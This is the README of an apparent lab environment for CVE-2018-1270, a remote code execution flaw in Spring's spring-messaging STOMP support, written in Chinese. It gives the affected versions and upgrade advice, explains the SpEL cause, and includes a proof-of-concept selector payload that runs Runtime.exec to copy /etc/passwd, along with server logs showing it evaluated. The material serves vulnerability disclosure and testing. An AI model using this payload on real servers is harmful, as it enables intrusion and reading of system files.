# CVE-2018-1270 - Spring messaging Spel 代码执行漏洞

昨天 Spring 公布了1个RCE漏洞，了解一下:

* [CVE-2018-1270: Remote Code Execution with spring-messaging](https://pivotal.io/security/cve-2018-1270)

影响版本

* Spring Framework 5.0 to 5.0.4
* Spring Framework 4.3 to 4.3.14

这个漏洞对环境没有要求，如果你在使用 `spring-messaging + websocket + STOMP`，请尽快升级到最新版本；如果你在用 SpringBoot，请升级到 `2.0.1.RELEASE`。

### 漏洞详情

简单说，由于 `StandardEvaluationContext` 权限太大，可以执行任意 SpEL 表达式，所以官方在 `Spring 5.0.5` 之后添加了 `SimpleEvaluationContext`，用于实现简单的数据绑定，保持灵活性但不带来安全隐患。

spring-messaging 提供了 STOMP 协议支持，允许客户端订阅消息，并使用 selector 去过滤消息，e.g

```
selector = 'T(java.lang.Runtime).getRuntime().exec("cp /etc/passwd /tmp")'
stompClient = Stomp.client('ws://localhost:8080/hello')
stompClient.connect({}, function(frame) {
    stompClient.subscribe('/topic/greetings', function() {}, {
        "selector": selector
    })
});
```

当你在订阅时，spring 会存储这个过滤器，并在客户端收到消息时触发，e.g

```
2018-04-07 08:32:20 [clientInboundChannel-3] TRACE o.s.m.s.b.DefaultSubscriptionRegistry - Subscription selector: [T(java.lang.Runtime).getRuntime().exec("cp /etc/passwd /tmp")]

...

2018-04-07 08:32:21 [MessageBroker-2] DEBUG o.s.m.s.b.DefaultSubscriptionRegistry - Failed to evaluate selector: EL1001E: Type conversion problem, cannot convert from java.lang.UNIXProcess to boolean
```

Poc 截屏

![screenshot](contrib/screenshot.jpg)

具体漏洞分析文章，稍后发出

### 环境使用方法

编译并启动 Spring Boot 服务器，

```
mvn clean package
java -jar target/spring-boot-websocket-1.0.jar
```

访问 - 输入表达式进行测试，

```
http://localhost:8080
```

![screenshot](contrib/web.jpg)





